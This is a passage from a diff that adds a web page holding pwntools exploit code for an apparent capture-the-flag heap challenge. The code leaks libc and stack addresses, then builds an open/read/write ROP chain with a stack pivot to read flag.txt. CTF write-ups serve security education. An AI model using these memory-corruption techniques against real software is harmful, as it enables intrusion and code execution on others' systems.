+    p.recvuntil(<span class="hljs-string">b&#x27;string: &#x27;</span>)
+    p.send(cont)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exit</span>():</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;command: &#x27;</span>)
+    p.send(<span class="hljs-string">b&#x27;E&#x27;</span>)
+    p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_hex</span>():</span>
+    p.recvuntil(<span class="hljs-string">b&#x27;hex-encoded bytes\n&#x27;</span>)
+    ls = p.recvline()[:-<span class="hljs-number">1</span>].split(<span class="hljs-string">b&#x27; &#x27;</span>)[<span class="hljs-number">1</span>:]
+    lb = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ls) // <span class="hljs-number">8</span>):
+        x = <span class="hljs-built_in">int</span>(ls[i * <span class="hljs-number">8</span> + <span class="hljs-number">7</span>], <span class="hljs-number">16</span>)
+        <span class="hljs-keyword">for</span> o <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
+            x &lt;&lt;= <span class="hljs-number">8</span>
+            x += <span class="hljs-built_in">int</span>(ls[i * <span class="hljs-number">8</span> + o], <span class="hljs-number">16</span>)
+        lb.append(x)
+    <span class="hljs-keyword">return</span> lb
+
+create(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">9</span>):
+    create(i, <span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):
+    free(i)
+
+free(<span class="hljs-number">0</span>)
+free(<span class="hljs-number">1</span>)
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>, <span class="hljs-number">7</span>):
+    create(i, <span class="hljs-number">0x10</span>, p64(<span class="hljs-number">0x8</span>))
+
+read(<span class="hljs-number">1</span>)
+lh = parse_hex()
+libc_leak = lh[<span class="hljs-number">0</span>] - <span class="hljs-number">0x30</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ch_ptr</span>(<span class="hljs-params">ptr, <span class="hljs-built_in">len</span></span>):</span>
+    write(<span class="hljs-number">6</span>, p64(<span class="hljs-built_in">len</span>)+ p64(ptr))
+
+libc_base = libc_leak - <span class="hljs-number">0x1f4c90</span>
+libc.address = libc_base
+
+environ_off = <span class="hljs-number">0x1fcec0</span>
+ch_ptr(libc_base + environ_off, <span class="hljs-number">0x8</span>)
+read(<span class="hljs-number">0</span>)
+lh = parse_hex()
+stack_leak = lh[<span class="hljs-number">0</span>]
+ret_addr = stack_leak - <span class="hljs-number">0x140</span>
+
+buf = <span class="hljs-number">0x404100</span>
+buf2 = <span class="hljs-number">0x404300</span>
+flag_addr = <span class="hljs-number">0x404500</span>
+flag_buf = <span class="hljs-number">0x404600</span>
+
+leave_ret = <span class="hljs-number">0x00000000004012da</span>
+pop_rdi = <span class="hljs-number">0x000000000002d7dd</span> + libc_base
+pop_rsi = <span class="hljs-number">0x000000000002eef9</span> + libc_base
+pop_rdx = <span class="hljs-number">0x00000000000d9c2d</span> + libc_base
+pop_rcx = <span class="hljs-number">0x0000000000110f8b</span> + libc_base
+rop = flat([buf2, pop_rdi, flag_addr, pop_rsi, <span class="hljs-number">0</span>, pop_rdx, <span class="hljs-number">0</span>, libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]
+            , pop_rdi, <span class="hljs-number">3</span>, pop_rsi, flag_buf, pop_rdx, <span class="hljs-number">0x100</span>, libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]
+            , pop_rdi, <span class="hljs-number">1</span>, pop_rsi, flag_buf, pop_rdx, <span class="hljs-number">0x100</span>, libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]])
+
+ch_ptr(flag_addr, <span class="hljs-number">0x30</span>)
+write(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;./flag.txt&#x27;</span>)
+
+ch_ptr(buf, <span class="hljs-built_in">len</span>(rop))
+write(<span class="hljs-number">0</span>, rop)
+
+ch_ptr(ret_addr - <span class="hljs-number">0x8</span>, <span class="hljs-number">0x10</span>)
+write(<span class="hljs-number">0</span>, p64(buf) + p64(leave_ret))
+exit()
+
+p.interactive()
+
+<span class="hljs-comment"># main_arena = __malloc_hook - 0x7500</span></code></pre>        </article>
+      </div>
+    </div>
+  </body>
+</html>
